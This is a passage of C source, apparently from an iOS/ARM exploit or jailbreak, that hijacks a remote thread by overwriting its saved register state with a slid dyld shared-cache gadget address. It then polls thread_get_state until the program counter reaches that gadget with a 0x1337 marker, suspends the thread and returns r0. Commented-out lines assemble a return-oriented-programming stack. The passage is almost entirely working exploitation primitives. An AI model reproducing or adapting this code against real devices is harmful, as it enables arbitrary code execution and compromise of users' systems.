//	write_u32(thread_state + (14 << 2), __stack_chk_fail_resolver + dyld_shc_slide);
//	printf("\t\t%x %x\n", pthread_ret, read_u32(pthread_ret));


	/*
	 *  spin wait for return
	 */
	while (true) {
		/*
		 *  reset, it's used as input for thread_state size
		 */
		write_u32(count, 17);
		calls4arg("thread_get_state", rth, ARM_THREAD_STATE, thread_state, count);

		/*
		 *  if the pc is in (resolver, resolver + 8), suspend the thread
		 *  (to not spin endlessly), read r0 and return
		 */
		if (((read_u32(thread_state + (15 << 2)) - (__stack_chk_fail_resolver + dyld_shc_slide)) <= 8) && (read_u32(thread_state + (11 << 2)) == 0x1337)) {
			calls4arg("thread_suspend", rth, 0, 0, 0);
			return read_u32(thread_state);
		}

//		calls4arg("usleep", 1000, 0, 0, 0);
	}
	
	/*
	write_u32(stack_shit + i_, 0x0); i_ += 4;
	write_u32(stack_shit + i_, 0x0); i_ += 4;
	write_u32(stack_shit + i_, 0x0); i_ += 4;
	write_u32(stack_shit + i_, 0x130000); i_ += 4;
	write_u32(stack_shit + i_, 0x0); i_ += 4;
	write_u32(stack_shit + i_, 0x0); i_ += 4;
	write_u32(stack_shit + i_, 0x0); i_ += 4;
	write_u32(stack_shit + i_, str_r0_r4 + slid); i_ += 4;*/

//	write_u32(stack_shit + i_, 0x0); i_ += 4;
//	write_u32(stack_shit + i_, 0x0); i_ += 4;
//	write_u32(stack_shit + i_, 0x0); i_ += 4;
//	write_u32(stack_shit + i_, 0x0); i_ += 4;
//	write_u32(stack_shit + i_, 0x0); i_ += 4;
//	write_u32(stack_shit + i_, 0x0); i_ += 4;
//	write_u32(stack_shit + i_, 0x0); i_ += 4;